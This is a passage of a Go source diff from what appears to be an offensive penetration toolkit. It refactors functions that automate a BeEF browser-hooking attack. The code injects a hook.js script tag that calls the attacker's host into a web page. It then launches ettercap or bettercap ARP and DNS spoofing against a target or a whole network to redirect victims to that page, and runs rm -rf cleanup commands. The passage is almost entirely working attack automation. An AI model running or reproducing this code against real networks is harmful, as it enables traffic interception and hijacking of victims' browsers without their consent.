+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
                         `africana-beef`: newString,
@@ -672,22 +695,21 @@ func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd 
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n" + bcolors.Endc)
+            fmt.Printf("\n%s[*] %sLaunching browser & ettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
-            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
-            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, IFace, RHost, Gateway)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
+            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, utils.IFace, utils.RHost, utils.Gateway)
             subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
     case "all":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
 
-            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
+            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
             filesToReplacements := map[string]map[string]string{
                 "/etc/beef-xss/config.yaml": {
                 `passwd: "beef"`: newString,
@@ -729,7 +751,7 @@ func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd 
             filePathT := "/etc/ettercap/etter.dns.bak_africana"
             if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                 subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", LHost)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.FakeDns, " A ", utils.LHost)
                 filesToReplacements := map[string]map[string]string{
                     "/etc/ettercap/etter.dns": {
                         `# vim:ts=8:noexpandtab`: newString,
@@ -740,7 +762,7 @@ func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd 
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                 subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
-                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
                         `africana-beef`: newString,
@@ -752,33 +774,32 @@ func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd 
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n" + bcolors.Endc)
+            fmt.Printf("\n%s[*] %sLaunching browser & ettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
-            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
-            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof ///`, IFace)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
+            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof ///`, utils.IFace)
             subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
+        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.NeMode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
 }
 
-func BeefBettercap(Mode string, LHost string, RHost string, IFace string, Passwd string, FakeDns string, Gateway string) {
-    if RHost == "" {
+func BeefBettercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
 
-    switch strings.ToLower(Mode) {
+    switch strings.ToLower(utils.NeMode) {
     case "single":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
+            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
             filesToReplacements := map[string]map[string]string{
                 "/etc/beef-xss/config.yaml": {
                 `passwd: "beef"`: newString,
@@ -803,7 +824,7 @@ func BeefBettercap(Mode string, LHost string, RHost string, IFace string, Passwd
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                 subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
-                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
                         `africana-beef`: newString,
@@ -815,24 +836,25 @@ func BeefBettercap(Mode string, LHost string, RHost string, IFace string, Passwd
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n" + bcolors.Endc)
+            fmt.Printf("\n%s[*] %sLaunching browser & bettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
-            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
-            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, LHost, IFace, RHost)
+
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
+            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, utils.LHost, utils.IFace, utils.RHost)
             subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; systemctl -l --no-pager status apache2.service beef-xss.service`)
 
     case "all":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
         if _, err := exec.LookPath("beef-xss"); err != nil {
             fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.BrightRed, bcolors.Endc)
             return
         }
+
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
 
-            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
+            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
             filesToReplacements := map[string]map[string]string{
                 "/etc/beef-xss/config.yaml": {
                 `passwd: "beef"`: newString,
@@ -857,7 +879,7 @@ func BeefBettercap(Mode string, LHost string, RHost string, IFace string, Passwd
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                 subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
-                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
                         `africana-beef`: newString,
@@ -869,33 +891,33 @@ func BeefBettercap(Mode string, LHost string, RHost string, IFace string, Passwd
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n" + bcolors.Endc)
+            fmt.Printf("\n%s[*] %sLaunching browser & bettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
-            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
-            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, IFace)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
+            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, utils.IFace)
             subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
+        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.NeMode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
 }
 
-func BeefKill(Spoofer string, Mode string, LHost string, RHost string, IFace string, Passwd string, FakeDns string, Gateway string) {
-    if Spoofer == "" {
+func BeefKill(Spoofer, NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
+    if utils.Spoofer == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
 
-    switch strings.ToLower(Spoofer) {
+    switch strings.ToLower(utils.Spoofer) {
     case "ettercap":
-        BeefEttercap(Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)
+        BeefEttercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)
     case "bettercap":
-        BeefBettercap(Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)
+        BeefBettercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Spoofer, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
+        fmt.Printf("\n%s[!] %sInvalid required parameters utils.Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.Spoofer, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
 }
